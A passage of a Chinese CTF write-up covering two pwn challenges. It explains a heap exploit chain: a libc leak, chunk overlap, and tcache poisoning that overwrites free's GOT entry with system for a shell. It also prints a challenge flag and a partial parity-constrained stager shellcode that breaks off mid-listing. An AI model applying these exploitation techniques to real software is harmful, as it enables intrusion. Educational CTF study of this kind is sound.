plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个题我感觉应该是和<code>ld.so</code>有关，可能堆上有canary相关信息。可惜fsbase在映射地址的低地址处，所以应该无法从这里读取canary。无论是<code>__stack_chk_fail</code>还是<code>_exit</code>我们似乎都没法干涉。还有可能，因为这个题给了很完整的环境，不知道<code>xinetd</code>产生进程是<code>fork</code>还是<code>spawn</code>，不知道canary是否共享？</p>
<blockquote>
<p>2024.5.29更新：看<a href="https://deepunk.icu/GeekCTF2024wp/" target="_blank" rel="noopener noreferrer">https://deepunk.icu/GeekCTF2024wp/</a>，写得好也很有梗</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pwn-flat">pwn-flat<a href="#pwn-flat" class="hash-link" aria-label="pwn-flat的直接链接" title="pwn-flat的直接链接">​</a></h2>
<p>这个题分为两部分，前半部分是去混淆，题目很明显是<code>ollvm</code>那种单个控制变量的混淆方法，非  常标准，在diagram里看的很清楚。</p>
<p><img decoding="async" loading="lazy" src="/assets/images/blok_view-360c25352b106bf1c3d0c3b140d41af2.png" width="1004" height="1022" class="img_ev3q"></p>
<p>我这里也是用了别人写的去混淆插件<a href="https://github.com/PAGalaxyLab/ghidra_scripts/blob/master/ollvm_deobf_fla.py" target="_blank" rel="noopener noreferrer">ollvm_deobf_fla</a></p>
<p>去混淆之后，就是经典的堆笔记管理系统，只不过没有回显。这个题也是增删改查都有，不过这些部分都没有漏洞（free后指针置空，大小和index两侧判断没有整数溢出，读取字符串至多读取n-1个并且最后一定会加上空字节），而是给了一个只能用一次的<code>bad</code>部分：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">bVar1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic">/* WARNING: Subroutine does not return */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bVar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> false</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iVar2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> FUN_004016b0_readint</span><span class="token operator" style="color:#393A34">?</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iVar2 </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x1f</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> iVar2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">note_ARRAY_004060b0</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">iVar2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">mem </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">0x0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">note_ARRAY_004060b0</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">iVar2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">length </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_16c </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> local_16c </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uint</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">note_ARRAY_004060b0</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">iVar2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local_16c </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> local_16c </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic">/* convert to char, so &gt;0x7f would overflow to negative */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">note_ARRAY_004060b0</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">iVar2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">mem </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">local_16c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里漏洞非常细微，实际上就是最后读取时，把<code>local_16c</code>从<code>uint</code>强制转换为了<code>char</code>。这样就导致，当这个块（下面称为目标块）长度大于0x100时，我们实际上是写入<code>0~0x7f</code>和<code>-0x80~0x0</code>。与此同时，这个题的LIBC版本是2.31（Ubuntu20.04），保护上没有PIE，Partial RELRO。</p>
<p>这个下溢和上溢其实各自有功能，我们分开说：</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="高地址溢出unsorted-bin-consolidate--leak-libc">高地址溢出：Unsorted bin Consolidate + leak LIBC<a href="#高地址溢出unsorted-bin-consolidate--leak-libc" class="hash-link" aria-label="高地址溢出：Unsorted bin Consolidate + leak LIBC的直接链接" title="高地址溢出：Unsorted bin Consolidate + leak LIBC的直接链接">​</a></h4>
<p>因为一般的输入会截断字符串，所以这个写入到目标块<code>0x7f</code>偏移是我们泄露堆内容的唯一机会。为此，我们要在目标块<code>0x80</code>的位置布置LIBC地址，比如说<code>0x70</code>处放一个unsortedbin并释放掉。</p>
<p>考虑到tcache的长度上限是<code>0x410</code>，我们可以申请两个<code>0x420</code>后（再申请一个<code>0x10</code>分隔top chunk），先释放高地址chunk进入unsorted bin，然后释放低地址，触发consolidate两个<code>chunk</code>合并为一个<code>0x840</code>，但高地址chunk的那个unsorted bin地址仍然在原来位置上（应该是<code>0x430</code>处）。之后再申请堆块时，假如tcache没有就会从这个<code>0x840</code>里面切，我们只需要保证切走<code>0x3a0</code>大小的堆块后，再申请新堆块时，那个地址就会在<code>0x90</code>处，去掉chunk头刚好就是0x80。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="低地址溢出chunk-extend--tcache-poisoning">低地址溢出：Chunk Extend + Tcache Poisoning<a href="#低地址溢出chunk-extend--tcache-poisoning" class="hash-link" aria-label="低地址溢出：Chunk Extend + Tcache Poisoning的直接链接" title="低地址溢出：Chunk Extend + Tcache Poisoning的直接链接">​</a></h4>
<p>当然，我们也要充分利用低地址的溢出，考虑到溢出范围有<code>0x80</code>那么大，除了自己的chunk头还能溢出0x70字节，我们可以考虑在目标块的低地址申请几个小的堆块（我用的是0x30, 0x20, 0x20），在溢出过程中修改其中最低的一个堆块的大小，使其与后面两个小堆块重叠，达成两个指针指向同一个内存的情况，便于UAF。注意修改chunk头后需要释放掉再申请回来（0x70大小），这样能重置程序里（而非ptmalloc）记录的大小字段，才能真正覆盖到后两个堆块。</p>
<p>之后的流程可以参考how2heap里的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c" target="_blank" rel="noopener noreferrer">tcache poisoning</a>，把两个<code>0x20</code>堆块释放后会进入tcache。如果把<code>next</code>字段改成GOT表，经历两次申请后tcache就会申请到GOT表位置的堆块。我们可以把GOT的free改成<code>system</code>，之后free掉包含<code>/bin/sh</code>的堆块就可以getshell。我比较喜欢把最开始那个分隔top chunk用的chunk写成<code>/bin/sh</code>，颇有狡兔死走狗烹的那种感觉。</p>
<p><code>flag{learning_deflat_trick_to_defeat_ollvm}</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pwn-shellcode">pwn-shellcode<a href="#pwn-shellcode" class="hash-link" aria-label="pwn-shellcode的直接链接" title="pwn-shellcode的直接链接">​</a></h2>
<p>有趣但折磨的shellcode题。程序读入一段shellcode，会对shellcode做一个很离谱的检查，然后在seccomp沙箱里执行（只允许open和read）。可以分为两个阶段。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="1-bypass-odd-even-check">1. bypass odd-even check<a href="#1-bypass-odd-even-check" class="hash-link" aria-label="1. bypass odd-even check的直接链接" title="1. bypass odd-even check的直接链接">​</a></h4>
<p>这个检查其实是最难的一部分。检查部分代码：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  sVar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">__buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  local_18 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">while</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> true </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">sVar1 </span><span class="token operator" style="color:#393A34">&lt;=</span><span class="token plain"> local_18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">__buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">__buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">local_18</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token char">&#x27;\x02&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> local_18 </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local_18 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> local_18 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>也就是说：shellcode需要偶数字节是偶数，奇数字节是小于128的奇数（大于128会得到-1），这个限制导致我们根本没法好好写shellcode，不过经过调试，我们可以获知此时rax，rsi, 都指向shellcode起始位置（栈顶），rdi为0。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> RAX  </span><span class="token number" style="color:#36acaa">0x7fc8a7859000</span><span class="token plain"> ◂— xor byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rcx</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dh </span><span class="token comment" style="color:#999988;font-style:italic">/* 0x31303130; &#x27;0101&#x27; */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> RBX  </span><span class="token number" style="color:#36acaa">0x0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> RCX  </span><span class="token number" style="color:#36acaa">0x1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> RDX  </span><span class="token number" style="color:#36acaa">0x0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> RDI  </span><span class="token number" style="color:#36acaa">0x0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> RSI  </span><span class="token number" style="color:#36acaa">0x7fc8a7859000</span><span class="token plain"> ◂— xor byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rcx</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dh </span><span class="token comment" style="color:#999988;font-style:italic">/* 0x31303130; &#x27;0101&#x27; */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R8   </span><span class="token number" style="color:#36acaa">0x55c0c9bb6b10</span><span class="token plain"> ◂— </span><span class="token number" style="color:#36acaa">0x55c595b7f7a6</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R9   </span><span class="token number" style="color:#36acaa">0x55c0c9bb6b10</span><span class="token plain"> ◂— </span><span class="token number" style="color:#36acaa">0x55c595b7f7a6</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R10  </span><span class="token number" style="color:#36acaa">0x1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R11  </span><span class="token number" style="color:#36acaa">0x246</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R12  </span><span class="token number" style="color:#36acaa">0x7fff2b577cb8</span><span class="token plain"> —▸ </span><span class="token number" style="color:#36acaa">0x7fff2b578df7</span><span class="token plain"> ◂— </span><span class="token char">&#x27;./shellcode&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R13  </span><span class="token number" style="color:#36acaa">0x55c0c7c43313</span><span class="token plain"> ◂— endbr64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R14  </span><span class="token number" style="color:#36acaa">0x0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> R15  </span><span class="token number" style="color:#36acaa">0x7fc8a785c040</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_rtld_global</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> —▸ </span><span class="token number" style="color:#36acaa">0x7fc8a785d2e0</span><span class="token plain"> —▸ </span><span class="token number" style="color:#36acaa">0x55c0c7c42000</span><span class="token plain"> ◂— </span><span class="token number" style="color:#36acaa">0x10102464c457f</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> RBP  </span><span class="token number" style="color:#36acaa">0x7fff2b577ba0</span><span class="token plain"> ◂— </span><span class="token number" style="color:#36acaa">0x1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token plain">RSP  </span><span class="token number" style="color:#36acaa">0x7fff2b577b88</span><span class="token plain"> —▸ </span><span class="token number" style="color:#36acaa">0x55c0c7c433d7</span><span class="token plain"> ◂— mov eax</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token plain">RIP  </span><span class="token number" style="color:#36acaa">0x7fc8a7859000</span><span class="token plain"> ◂— xor byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rcx</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dh </span><span class="token comment" style="color:#999988;font-style:italic">/* 0x31303130; &#x27;0101&#x27; */</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>所以我们第一阶段目标是重新调用一次read，以在没有限制的情况下导入新的shellcode。这需要：</p>
<ul>
<li>RAX=0</li>
<li>RDX=非零值，最好大于0x100小于0x1000（防止越界写报SIGSEGV或者read不成功）</li>
<li>调用syscall</li>
</ul>
<p>经过一些尝试，我们发现在一些汇编指令上进行微调（改变某些位的值）可能得到与原来语句功能类似的指令。主要的发现：</p>
<ul>
<li>指令的第一个字节通常定义了操作类型（add, xor, sub等），第二个字节的最后一个hex会决定第一个被操作的寄存器。考虑到奇偶性，比如通常rax, rdx是偶数，rsi, rbx是奇数。后面的通常会是操作数。</li>
<li>常用于函数调用的寄存器，如rdi, rdx, rsi, rax等，其push/pop指令通常很短，只有一个字节，可以用来奇数组和偶数组寄存器交换数据，比如<code>50 5b</code>等效于<code>push rax; pop rbx</code>，就把栈地址交给<code>rbx</code></li>
<li><code>80 43 0c 01</code>等效于<code>add BYTE PTR [rbx+0xc], 0x1</code>。这个是非常有用的gadget，可以将shellcode某个位于偶数位置的字节变为奇数（特别是这个数可以大于128）。印象中有一个类似的gadget<code>add DWORD PTR [rax+0xb], 0x2</code>可以把奇数位置的字节变为大于128的值，但是不如这个有用。</li>
<li>等效NOP指令：这个题里NOP指令用于填充调整奇偶位，起到重要的辅助作用。正常的<code>\x90</code>可以用于奇数位和奇数位。但对于刚刚五字节的gadget，我们需要一个连接偶字节和偶字节的gadget。一番遍历后，我找到了<code>xor BYTE PTR [r9], al</code> == <code>41 30 01</code>，因为R9在调试中是一个可写的地址，并且我们在这个阶段不会用到R9。</li>
<li>关于rdx的取值：我们注意到R11寄存器的值是<code>0x246</code>，非常合适。<code>push r11; pop rdx</code>==<code>41 53 5a</code>，除了第一个是奇数外都很完美，而我们此时已经获得了修改偶数位置字节位奇数的能力。</li>
<li>关于syscall：同理，syscall为<code>0f 05</code>，需要改掉第一个字节。</li>
<li>结尾的细节：首先<code>syscall</code>后需要是一个NOP（<code>90</code>），因为执行syscall的时候CPU已经取到了下一个指令，我们必须要保证这个指令合法，后面的就是read后的新shellcode了。其次，因为read输入的结尾会加一个换行<code>0a</code>，所以<code>90</code>后还要补一个任意合法奇数。</li>
</ul>
<p>最终shellcode (考虑SMC修正后):</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">0</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">50</span><span class="token plain">                      push   rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">5</span><span class="token plain">b                      pop    rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">31</span><span class="token plain"> c0                xor    rax</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">5</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">41</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">01</span><span class="token plain">                xor    BYTE PTR </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">r9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">8</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">43</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">c </span><span class="token number" style="color:#36acaa">01</span><span class="token plain">             add    BYTE PTR </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rbx</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0xc</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   c</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">41</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token plain">                   push   r11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   e</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">5</span><span class="token plain">a                      pop    rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   f</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">41</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">01</span><span class="token plain">                xor    BYTE PTR </span><span class="token punctuation" 